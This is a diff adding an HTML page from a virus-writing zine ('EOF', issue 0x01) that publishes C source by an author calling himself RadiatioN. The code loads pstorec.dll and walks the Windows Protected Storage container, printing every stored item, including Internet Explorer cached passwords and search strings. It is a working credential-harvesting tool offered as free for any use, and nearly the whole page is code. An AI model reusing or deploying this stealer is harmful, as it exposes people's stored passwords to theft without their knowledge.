@@ -1,0 +1,113 @@
+<html><head><title>EOF ISSUE #0x01</title>
+<style fprolloverstyle>A:hover {color: #D1F2C4; text-decoration: none}</style></head>
+<body text="#E0E0E0" bgcolor="#131313" link="#BFBFBF" vlink="#BFBFBF" alink="#BFBFBF" style="font-size: 10pt">
+
+<pre><hr>|| Author: RadiatioN/EOF || <a style="text-decoration: none" href="../mainmenu/sources.htm"><span style="text-decoration: none">Back to sources</span></a> || <a style="text-decoration: none" target="_blank" href="../binsrc/RadiatioN/PStore"><span style="text-decoration: none; color: #BFBF88">View project folder</span></a> || <hr></pre>
+<pre>
+/*
+
+With this short code you can read all stored data like search strings and IE cached 
+passwords in the 'secure' data container in the system.
+this code (should) work on all OS version of windows higher than 9x; i tried it on W2K and XP SP2
+
+No Copyright - free for any use
+
+Written by RadiatioN in September-October 2006
+
+Zine and group site:
+EOF - Electrical Ordered Freedom
+http://www.eof-project.net
+
+My site:
+RadiatioN's VX World
+http://radiation.eof-project.net
+
+Contact:
+radiation[at]eof-project[dot]net
+
+some nice greetings to Sky my good friend :)
+
+ATTENTION:
+Based on your system where you compile this code you must edit &quot;stdafx.h&quot;.
+There is a line importing pstore.dll, just change the path to C:\WINNT or C:\WINDOWS
+
+*/
+
+#include &quot;stdafx.h&quot;
+
+typedef HRESULT (WINAPI *PStoreCreateInstancePtr)(IPStore **, DWORD, DWORD, DWORD);
+
+int IsUnicode(unsigned char *data, unsigned long length)
+{
+	for(unsigned int i=0; i&lt;length-1; i++)
+	{
+		if(data[i] == 0) return 1;
+	}
+
+	return 0;
+}
+
+void GetStoredPasswords(void)
+{
+	HRESULT hRes;
+	HMODULE hPstoreDLL;
+	IPStorePtr spPStore;
+	IEnumPStoreTypesPtr spEnumTypes, spEnumSubTypes;
+	IEnumPStoreItemsPtr spEnumItems;
+	GUID typeGUID, subtypeGUID;
+	LPWSTR szItemName;
+	unsigned long pcbData = 0;
+	unsigned char *ppbData = NULL;
+	_PST_PROMPTINFO *pi = NULL;
+	char szPw[512]=&quot;&quot;;
+
+	hPstoreDLL = LoadLibrary(&quot;pstorec.dll&quot;);
+	PStoreCreateInstancePtr PStoreCreateInstance = (PStoreCreateInstancePtr)GetProcAddress(hPstoreDLL, &quot;PStoreCreateInstance&quot;);
+
+	hRes = PStoreCreateInstance(&amp;spPStore, 0, 0, 0);
+	hRes = spPStore-&gt;EnumTypes(0, 0, &amp;spEnumTypes);
+
+	while(spEnumTypes-&gt;raw_Next(1, &amp;typeGUID, 0) == S_OK)
+	{
+		printf(&quot;TypeGUID = %.8x\r\n&quot;, typeGUID);
+		
+		hRes = spPStore-&gt;EnumSubtypes(0, &amp;typeGUID, 0, &amp;spEnumSubTypes);		
+
+		while(spEnumSubTypes-&gt;raw_Next(1, &amp;subtypeGUID, 0) == S_OK)
+		{
+			printf(&quot;\tSubtypeGUID = %.8x\r\n&quot;, subtypeGUID);
+			
+			hRes = spPStore-&gt;EnumItems(0, &amp;typeGUID, &amp;subtypeGUID, 0, &amp;spEnumItems);
+
+			while(spEnumItems-&gt;raw_Next(1, &amp;szItemName, 0) == S_OK)
+			{
+				printf(&quot;\t\tItemName = %ws\r\n&quot;, szItemName);
+				
+				pcbData = 0;
+				ppbData = NULL;
+				pi = NULL;
+
+				hRes = spPStore-&gt;ReadItem(0, &amp;typeGUID, &amp;subtypeGUID, szItemName, &amp;pcbData, &amp;ppbData, pi, 0);
+
+				if(IsUnicode(ppbData, pcbData))
+				{
+					printf(&quot;\t\tItemData = %ws\r\n&quot;,ppbData);					
+				}
+				else
+				{
+					printf(&quot;\t\tItemData = %s\r\n&quot;,ppbData);
+				}
+			}
+		}
+	}
+}
+
+int _tmain(int argc, _TCHAR* argv[])
+{
+	GetStoredPasswords();
+
+	_getch();
+
+	return 0;
+}
+</pre></body></html>
